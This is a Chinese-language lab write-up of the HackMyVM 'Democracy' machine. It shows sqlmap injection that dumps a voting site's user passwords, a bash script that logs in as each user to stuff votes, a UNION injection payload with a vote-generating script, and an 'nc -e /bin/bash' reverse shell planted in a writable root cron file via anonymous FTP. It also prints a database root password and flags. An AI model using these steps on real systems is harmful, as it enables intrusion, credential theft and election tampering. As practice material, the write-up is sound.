---
title: Democracy
author: hgbe02
date: 2024-04-29
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Democracy.html"
---

# Democracy

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547027.png" alt="image-20240428124351518" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547029.png" alt="image-20240429134459296" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/Democracy]
└─$ rustscan -a 192.168.0.148 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.148:22
Open 192.168.0.148:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Vote for Your Candidate
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/Democracy]
└─$ gobuster dir -u http://192.168.0.148/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.148/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,txt,html,php,zip,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.148/images/]
/login.php            (Status: 200) [Size: 2115]
/register.php         (Status: 200) [Size: 2116]
/index.php            (Status: 200) [Size: 2676]
/vote.php             (Status: 302) [Size: 0] [--> login.php]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.0.148/javascript/]
/config.php           (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1143984 / 1543927 (74.10%)
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547030.png" alt="image-20240429134745740" style="zoom:50%;" />

### 敏感目录

```apl
http://192.168.0.148/login.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547031.png" alt="image-20240429134827251" style="zoom:33%;" />

```apl
http://192.168.0.148/register.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547032.png" alt="image-20240429134910144" style="zoom:50%;" />

### 注册再登录

注册了一个用户：

```apl
hack
hack
```

然后进行登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547033.png" alt="image-20240429140409893" style="zoom:50%;" />

是一个投票界面，尝试投票：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547034.png" alt="image-20240429140443060" style="zoom:50%;" />

### sql注入

可以看票数和重置，抓包看一下：

```bash
POST /vote.php HTTP/1.1
Host: 192.168.0.148
Content-Length: 18
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.148
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.148/vote.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=s7nd60540gjrp3rlqq0gssahi9
Connection: close

candidate=democrat
```

尝试进行sql注入：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547035.png" alt="image-20240429142050176" style="zoom:50%;" />

尝试添加参数：

```bash
sqlmap --url http://192.168.0.148/vote.php --data candidate=democrat --cookie "PHPSESSID=5f95vmufeiq5j7q92nc6v9iriv; voted=1" --batch --dbs
```

但是每次尝试都得重置一下，不然无法进行投票，写一个脚本重置：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547036.png" alt="image-20240429143135463" style="zoom:50%;" />

```bash
while true; do curl -s http://192.168.0.148/vote.php -b "PHPSESSID=5f95vmufeiq5j7q92nc6v9iriv; voted=1" -d "reset=1"; done
```

丢在后台运行就行了，然后运行：

```bash
sqlmap --url http://192.168.0.148/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=5f95vmufeiq5j7q92nc6v9iriv; voted=1" --batch --dbs
```

```apl
[02:39:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[02:39:08] [INFO] fetching database names
[02:39:08] [INFO] retrieved: 'information_schema'
[02:39:08] [INFO] retrieved: 'voting'
available databases [2]:
[*] information_schema
[*] voting
```

进一步注入：

```bash
sqlmap --url http://192.168.0.148/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=5f95vmufeiq5j7q92nc6v9iriv; voted=1" --batch --dbs -D voting --tables
```

```apl
Database: voting
[2 tables]
+-------+
| users |
| votes |
+-------+
```

然后获取相应表：

```bash
sqlmap --url http://192.168.0.148/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=5f95vmufeiq5j7q92nc6v9iriv; voted=1" --batch --dbs -D voting -T votes --columns
```

```apl
Database: voting
Table: votes
[3 columns]
+-----------+-----------------+
| Column    | Type            |
+-----------+-----------------+
| candidate | varchar(30)     |
| id        | int(6) unsigned |
| user_id   | int(6)          |
+-----------+-----------------+
```

```bash
sqlmap --url http://192.168.0.148/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=5f95vmufeiq5j7q92nc6v9iriv; voted=1" --batch --dbs -D voting -T users --columns
```

```apl
Database: voting
Table: users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+
```

dump一下相关数据：

```bash
sqlmap --url http://192.168.0.148/vote.php --data "candidate=flag" -p candidate --cookie "PHPSESSID=5f95vmufeiq5j7q92nc6v9iriv; voted=1" --batch --dbs -D voting -T users --dump
```

```apl
Database: voting
Table: users
[1001 entries]
+------+---------------+---------------+
| id   | password      | username      |
+------+---------------+---------------+
[02:45:23] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 746  | 26021961      | la            |
| 747  | 20021972      | fancie        |
| 748  | spangle       | shamshad      |
| 749  | elena1977     | inesita       |
| 750  | foxxxy        | ramaprakash   |
| 751  | juliet1       | athene        |
| 752  | 060183        | gill          |
..........
| 997  | wonton        | wiebren       |
| 1010 | 78945641561   | zack77        |
| 1011 | blaze         | riyo          |
| 1012 | 7786546pass   | dodo          |
| 1015 | hack          | hack          |
+------+---------------+---------------+
```

### 投票

首先要处理一下数据：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547037.png" alt="image-20240429144741173" style="zoom: 50%;" />

然后尝试提取一下用户与密码：

```bash
cat /home/kali/.local/share/sqlmap/output/192.168.0.148/dump/voting/users.csv | cut -d "," -f 3 > username
cat /home/kali/.local/share/sqlmap/output/192.168.0.148/dump/voting/users.csv | cut -d "," -f 2 > password
```

然后，使用shell进行批量登录，和投票：

```bash
┌──(kali💀kali)-[~/Democracy]
└─$ curl -s -i "http://192.168.0.148/login.php" -d "username=hack&password=hack" | grep "Cookie" | awk '{print $2}' |sed 's/;$//'

PHPSESSID=cbshugnskc7diu8srsdtm922a6;
```

```bash
#!/bin/bash

url="http://192.168.0.148"

paste username password | while IFS=$'\t' read -e user pass
do
	cookie=$(curl -s -i "$url/login.php" -d "username=$user&password=$pass" | grep "Cookie" | awk '{print $2}'|sed 's/;$//')
	curl -s "$url/vote.php" -b "$cookie" -d "candidate=democrat" >/dev/null
    echo "[+] $user has voted!"
done
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547039.png" alt="image-20240429153919505" style="zoom:50%;" />

直到：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547040.png" alt="image-20240429153952601" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547041.png" alt="image-20240429154016339" style="zoom:50%;" />

### 重新扫描

```bash
┌──(kali💀kali)-[~/Democracy]
└─$ rustscan -a 192.168.0.148 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.148:21
Open 192.168.0.148:22
Open 192.168.0.148:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx   1 root     root          258 Apr 30  2023 votes [NSE: writeable]
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
80/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-title: Vote for Your Candidate
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

发现开放了`ftp`端口！匿名登录，发现可修改，重新修改上传，反弹shell过来：

```bash
┌──(kali💀kali)-[~/Democracy]
└─$ ftp 192.168.0.148     
Connected to 192.168.0.148.
220 ProFTPD Server (Debian) [::ffff:192.168.0.148]
Name (192.168.0.148:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||61169|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      nogroup      4096 Apr 30  2023 .
drwxr-xr-x   2 ftp      nogroup      4096 Apr 30  2023 ..
-rwxrwxrwx   1 root     root          258 Apr 30  2023 votes
226 Transfer complete
ftp> get votes
local: votes remote: votes
229 Entering Extended Passive Mode (|||47430|)
150 Opening BINARY mode data connection for votes (258 bytes)
100% |***********************************************************************************************************|   258        2.96 MiB/s    00:00 ETA
226 Transfer complete
258 bytes received in 00:00 (390.62 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali💀kali)-[~/Democracy]
└─$ cat votes                                                                                                 
#! /bin/bash

## this script runs every minute ##

#!/bin/bash

mysql -u root -pYklX69Vfa voting << EOF

SELECT COUNT(*) FROM votes WHERE candidate='republican';

SELECT COUNT(*) FROM votes WHERE candidate='democrat';

EOF

nc -e /bin/bash 192.168.0.29 4444

┌──(kali💀kali)-[~/Democracy]
└─$ vim votes

┌──(kali💀kali)-[~/Democracy]
└─$ cat votes
#! /bin/bash

## this script runs every minute ##

#!/bin/bash

mysql -u root -pYklX69Vfa voting << EOF

SELECT COUNT(*) FROM votes WHERE candidate='republican';

SELECT COUNT(*) FROM votes WHERE candidate='democrat';

EOF

nc -e /bin/bash 192.168.0.143 1234

┌──(kali💀kali)-[~/Democracy]
└─$ ftp 192.168.0.148
Connected to 192.168.0.148.
220 ProFTPD Server (Debian) [::ffff:192.168.0.148]
Name (192.168.0.148:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put votes
local: votes remote: votes
229 Entering Extended Passive Mode (|||31574|)
150 Opening BINARY mode data connection for votes
100% |***********************************************************************************************************|   259        2.44 MiB/s    00:00 ETA
226 Transfer complete
259 bytes sent in 00:00 (243.20 KiB/s)
ftp> exit
221 Goodbye.
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404291547042.png" alt="image-20240429154415334" style="zoom:50%;" />

拿下rootshell了！！！！读取flag！

```bash
(remote) root@democracy.hmv:/root# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
(remote) root@democracy.hmv:/root# ls -la
total 28
drwx------  4 root root 4096 Apr 30  2023 .
drwxr-xr-x 19 root root 4096 Apr 30  2023 ..
lrwxrwxrwx  1 root root    9 Feb  6  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  2 root root 4096 Apr 30  2023 .cache
drwxr-xr-x  3 root root 4096 Apr 30  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rwx------  1 root root   33 Apr 30  2023 root.txt
(remote) root@democracy.hmv:/root# cat root.txt 
081c1bc3fe537326ad7bcb8e571b1f5h
(remote) root@democracy.hmv:/root# cd /home
(remote) root@democracy.hmv:/home# ls
trump
(remote) root@democracy.hmv:/home# cd trump/
(remote) root@democracy.hmv:/home/trump# ls -la
total 24
drwxr-xr-x 2 trump trump 4096 Apr 30  2023 .
drwxr-xr-x 3 root  root  4096 Apr 30  2023 ..
lrwxrwxrwx 1 root  root     9 Apr 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 trump trump  220 Apr 30  2023 .bash_logout
-rw-r--r-- 1 trump trump 3526 Apr 30  2023 .bashrc
-rw-r--r-- 1 trump trump  807 Apr 30  2023 .profile
-rwx------ 1 trump trump   33 Apr 30  2023 user.txt
(remote) root@democracy.hmv:/home/trump# cat user.txt 
399dba2fcf50acb2110f5e44380d20e4
```

### 解法二：抓包进行修改

在`0xh3rshel`师傅博客看到的做法：

```bash
candidate=democrat')+union+SELECT+1,"democrat"+--+-
```

```python
#!/bin/python3

result = "democrat')+"

for i in range(1,1001):
   result = result + 'union+SELECT+'+str(i)+',"democrat"+'
result = result + "--+-"

print(result)
```

抓包修改放进去，运行自动投票！！！！！	神乎其技！！！

## 参考

https://0xh3rshel.github.io/hmv-democracy/

https://www.youtube.com/watch?v=bwuiViw7JWs